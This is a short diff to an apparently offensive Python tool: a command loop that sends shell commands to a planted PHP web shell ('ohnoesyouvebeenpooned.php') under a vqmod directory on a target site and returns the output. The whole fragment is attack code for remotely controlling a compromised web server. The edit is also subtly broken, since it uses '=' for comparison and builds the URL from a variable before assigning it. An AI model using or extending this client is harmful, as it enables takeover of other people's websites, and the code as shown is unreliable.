@@ -101,7 +101,8 @@ class loop(Cmd):
         target = url + "../vqmod/xml/ohnoesyouvebeenpooned.php?getfukt=" + cmd_response
         cmd_response = requests.get(target)
         try:
-            return cmd_response
+            if cmd_response.status_code = 200:
+                return cmd_response.content
         except:
             return None
 
